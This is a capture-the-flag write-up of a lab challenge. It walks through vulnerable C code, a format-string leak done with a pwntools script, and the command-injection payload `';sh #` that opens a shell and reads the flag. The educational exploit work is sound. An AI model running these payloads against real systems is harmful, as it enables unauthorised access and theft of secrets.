# **challenge**: **console**

<div style="background: #161b22; border: 1px solid #30363d; border-left: 8px solid #238636; border-radius: 10px; padding: 20px; margin: 20px 0; font-family: monospace;">
    <hr style="border: 0; border-top: 1px solid #30363d; margin: 10px 0;">
    <ul style="list-style: none; padding: 0; margin: 0; font-size: 1.2em; color: #8b949e;">
        <li>🟢 <b>difficulty:</b> <span style="color: #3fb950;">easy</span></li>
        <li>⚡ <b>xp earned:</b> <span style="color: #d29922;">150</span></li>
        <li>📂 <b>categories:</b> <code>code review</code>, <code>binary exploitation</code></li>
        <li>🛠️ <b>vulns:</b> <code>format string</code>, <code>command injection</code></li>
    </ul>
</div>

## 0x00: intro
- the challenge give us a zip containing:
    ```    
    ├── debug_console.sh
    ├── Dockerfile
    ├── entrypoint.sh
    ├── flag.txt
    ├── main
    └── main.c
    ```
- to interact with the real binary, we need connect to `10.10.0.5:1337` via netcat.
- hopefully, we dont need to reverse this binary, just understand the source code and perform the exploitation. so, lets do this.
    ```c
    #include <stdio.h>
    #include <stdlib.h>
    #include <string.h>

    void debugConsole()
    {
        size_t inputSize = 10;
        char* input = (char*)malloc(inputSize * sizeof(char));

        printf("Choose: process,whoami,id\n> ");

        if(fgets(input, inputSize, stdin) == NULL) {
            printf("Error\n");
            return;
        }

        input[strlen(input) - 1] = '\0';

        size_t commandSize = 255;
        char* command = (char*)malloc(commandSize * sizeof(command));

        sprintf(command, "./debug_console.sh '%s'", input);

        system(command);
    }

    int main()
    {
        setvbuf(stdin, NULL, _IONBF, 0);
        setvbuf(stdout, NULL, _IONBF, 0);

        char secret[] = "FAKE_SECRET";

        printf("Secret: ");

        size_t secretInputSize = 255;
        char* secretInputBuffer = (char*)malloc(secretInputSize * sizeof(char));

        if(fgets(secretInputBuffer, secretInputSize, stdin) == NULL) {
            printf("Error\n");
            return 1;
        }

        secretInputBuffer[strlen(secretInputBuffer) - 1] = '\0';

        if(strcmp(secretInputBuffer, secret)) {
            size_t outputBufferSize = 255;
            char* outputBuffer = (char*)malloc(outputBufferSize * sizeof(char));

            sprintf(outputBuffer, "Invalid Secret: %s\n", secretInputBuffer);

            printf(outputBuffer);

            return 1;
        }

        debugConsole();

        return 0;
    }
    ```
- in the next topic, we will spot all the vulnerabilities here.

## 0x01: command injection
- at first, lets analyze the `debugConsole()` function
    ```c
    void debugConsole()
    {
        size_t inputSize = 10;
        char* input = (char*)malloc(inputSize * sizeof(char)); // user-input

        printf("Choose: process,whoami,id\n> ");

        if(fgets(input, inputSize, stdin) == NULL) {
            printf("Error\n");
            return;
        }

        input[strlen(input) - 1] = '\0';

        size_t commandSize = 255;
        char* command = (char*)malloc(commandSize * sizeof(command)); // command is declared here

        sprintf(command, "./debug_console.sh '%s'", input); // e.g: ./debug_console.sh 'id'

        system(command); // first-look
    }
    ```
- when im doing code review, i look up first for functions that executes system commands, like `system()` and `exec()` (in C) and follow the way of the parameters that they takes. in this case, we have `system()` called with `command`, wich in turn, its 255-byte array char.
- that parameter recieves, via `sprintf()`, this content: `./debug_console.sh '<input>'`, where `input` is the user-input. so, lets take a look in this shell script.
    ```sh
    #!/bin/bash

    if [[ "$1" == "process" ]]; then
        ps aux
    elif [[ "$1" == "whoami" ]] then
        whoami
    elif [[ "$1" == "id" ]] then
        id
    else
        echo "Usage: $0 <process,whoami,id>"
    fi
    ```
- this is just a simple bash script to execute specific linux commands, but we can bypass this and execute arbitrary commands just passing something like this on our input: `';sh #`, because with this, `command` should be: `./debug_console.sh '';sh #`. we close the quotes and call sh.

## 0x02: format string
- ok, we know how to execute arbitrary commands, but, reading `main()`, we see that we need an secret to call the vulnerable `debugConsole()`, see:
    ```c
    char secret[] = "FAKE_SECRET"; // in the real environment, obviously isn't that secret.

    printf("Secret: ");

    size_t secretInputSize = 255;
    char* secretInputBuffer = (char*)malloc(secretInputSize * sizeof(char));

    if(fgets(secretInputBuffer, secretInputSize, stdin) == NULL) {
        printf("Error\n");
        return 1;
    }

    secretInputBuffer[strlen(secretInputBuffer) - 1] = '\0';

    if(strcmp(secretInputBuffer, secret)) {
        size_t outputBufferSize = 255;
        char* outputBuffer = (char*)malloc(outputBufferSize * sizeof(char));

        sprintf(outputBuffer, "Invalid Secret: %s\n", secretInputBuffer);

        printf(outputBuffer); // vulnerable to format string
        // correct: printf("%s", outputBuffer);

        return 1;
    }

    debugConsole();
    ```
- analyzing this code, we note that our input, `secretInputBuffer` are compared to `secret[]`, if match, `debugConsole()` are called, if not, the program terminates. but, in both cases, our input is printed without the format string (`%s`).
- format string is a template used in many languages to insert dynamic data into a fixed text, using placeholders like `%s`, `%d`, `%zu`, etc. that specify the data type and formatting. basically, he act like a reference to data into the program memory.
- this allow us to put our own format string and recover values directly from stack (`%p`). so, exploiting this format string vulnerabilitie, we can get the real value of the secret. before this, lets understand how to do this.
    ```bash
    ➜  attachments ./main
    Secret: %p.%p.%p.%p
    Invalid Secret: 0x616ded17905a.(nil).(nil).0x73
    ```
- as we can see, we can recover four hexadecimal values directly from the stack. to type less, its possible replace `%p.%p.%p.%p` with `%4$p`, look:
    ```bash
    ➜  attachments ./main
    Secret: %4$p
    Invalid Secret: 0x73
    ```

## 0x03: show me the code (and the flag!)
- after all that, we can just write a python script to recover some values from stack, decode from hex to get the secret and finally, get the shell.
    ```py
    from pwn import *

    addr = '10.10.0.5'
    port = 1337

    def send_payload(payload):
        try:
            r = remote(addr, port, level='error')
            r.recvuntil(b"Secret: ")
            r.sendline(payload.encode())
            response = r.recvline().decode(errors='ignore')
            r.close()
            return response
        except:
            return ""

    print("[+] reading values from stack with f-string")

    for i in range(1, 25):

        payload = f"%{i}$p"
        result  = send_payload(payload)
        
        if "Invalid Secret:" in result:
            leak = result.split("Invalid Secret: ")[1].strip()
            
            decoded = ""
            try:
                clean_hex = leak.replace("0x", "")
                if len(clean_hex) % 2 != 0:
                    clean_hex = "0" + clean_hex
                
                byte_val = bytes.fromhex(clean_hex)
                decoded = byte_val[::-1].decode(errors='ignore')
            except:
                decoded = "(non-ascii)"

            print(f"[*] offset {i}: {leak} -> {decoded}")
    ```
- executing our simple script, we retrieve the secret:
    ```bash
    ➜  attachments python3 fstring.py
    [+] reading values from stack with f-string
    [*] offset 1: 0x559291b6505a -> ZPU
    [*] offset 2: (nil) -> (non-ascii)
    [*] offset 3: (nil) -> (non-ascii)
    [*] offset 4: 0x73 -> s
    [*] offset 5: (nil) -> (non-ascii)
    [*] offset 6: 0xff ->
    [*] offset 7: 0x5565ad4162a0 -> bAeU
    [*] offset 8: 0xff ->
    [*] offset 9: 0x55b072eb03b0 -> \x03rU
    [*] offset 10: 0x4b5f743372633353 -> S3cr3t_K
    [*] offset 11: 0x33643135625f7933 -> [redacted]
    [*] offset 12: 0x5f4a525f35 -> 5_RJ_
    [*] offset 13: 0xb33f7aee9863ff00 -> \x00cz?
    ```
- finally, taking the flag:
    ```bash
    ➜  attachments nc 10.10.0.5 1337 -vvv
    10.10.0.5: inverse host lookup failed: Unknown host
    (UNKNOWN) [10.10.0.5] 1337 (?) open
    Secret: [redacted]
    Choose: process,whoami,id
    > ';sh #
    Usage: ./debug_console.sh <process,whoami,id>
    id
    uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)
    cat /flag-[redacted].txt
    hackingclub{raffa_moreira_mano_777}
    ```